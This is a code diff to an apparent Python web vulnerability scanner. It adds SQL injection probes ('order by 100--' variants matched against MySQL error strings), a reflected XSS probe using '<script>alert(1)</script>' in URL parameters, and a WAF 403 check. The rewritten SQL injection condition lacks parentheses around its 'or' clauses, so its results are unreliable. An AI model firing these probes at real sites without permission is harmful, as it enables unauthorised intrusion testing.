@@ -140,7 +140,15 @@ def XSS():
                 to=0
                 try:
                     if sqli==1:
-                        req = requests.get(i+"'", 'html.parser',timeout=3).text
+                        k=f"{i}+order+by+100--"
+                        l=f"{i}'+order+by+100--+-"
+                        reqq = requests.get(k, 'html.parser',timeout=3).text
+                        req= reqq.lower()
+                        if 'unknown' in str(req) or 'column' in str(req) or 'mysql_fetch' in str(req) or 'mysqli' in str(req) or 'on line' in str(req) or 'at line' in str(req):
+                            pass
+                        else:
+                            reqq = requests.get(l, 'html.parser',timeout=3).text
+                            req= reqq.lower()
                     elif xss==1:
                         j = i.replace('=','=<script>alert(1)</script>')
                         req = requests.get(j, 'html.parser',timeout=3).text
@@ -152,9 +160,12 @@ def XSS():
                 if "alert(1)" in str(req):
                     print(style.RED +"[XSS] "+i)
                     wrt.write("[XSS] "+i)
-                elif sqli==1 and 'sql' in str(req):
+                elif sqli==1 and 'unknown' in str(req) or 'column' in str(req) or 'mysql_fetch' in str(req) or 'mysqli' in str(req) or 'on line' in str(req) or 'at line' in str(req):
                     print(style.RED +"[SQL INJECTION] "+i)
                     wrt.write("[SQL INJECTION] "+i)
+                elif "php" in str(i) and "Forbidden" in str(req) and "403" in str(req):
+                    print(style.RED +"[WAF] "+i)
+                    wrt.write("[WAF] "+i)
                 elif to == 1:
                     print(style.YELLOW +"[TIMEOUT] "+i)
                 else:
@@ -169,7 +180,15 @@ def XSS():
                 to=0
                 try:
                     if sqli==1:
-                        req = requests.get(i+"'", 'html.parser',timeout=3).text
+                        k=f"{i}+order+by+100--"
+                        l=f"{i}'+order+by+100--+-"
+                        reqq = requests.get(k, 'html.parser',timeout=3).text
+                        req= reqq.lower()
+                        if 'unknown' in str(req) or 'column' in str(req) or 'mysql_fetch' in str(req) or 'mysqli' in str(req) or 'on line' in str(req) or 'at line' in str(req):
+                            pass
+                        else:
+                            reqq = requests.get(l, 'html.parser',timeout=3).text
+                            req= reqq.lower()
                     elif xss==1:
                         j = i.replace('=','=<script>alert(1)</script>')
                         req = requests.get(j, 'html.parser',timeout=3).text
@@ -180,8 +199,11 @@ def XSS():
                     to = 1
                 if "alert(1)" in str(req):
                     print(style.RED +"[XSS] "+i)
-                elif sqli==1 and 'sql' in str(req):
+                elif sqli==1 and 'unknown' in str(req) or 'column' in str(req) or 'mysql_fetch' in str(req) or 'mysqli' in str(req) or 'on line' in str(req) or 'at line' in str(req):
                     print(style.RED +"[SQL INJECTION] "+i)
+                elif "php" in str(i) and "forbidden" in str(req) and "403" in str(req):
+                    print(i)
+                    print(style.RED +"[WAF] "+i)
                 elif to == 1:
                     print(style.YELLOW +"[TIMEOUT] "+i)
                 else:
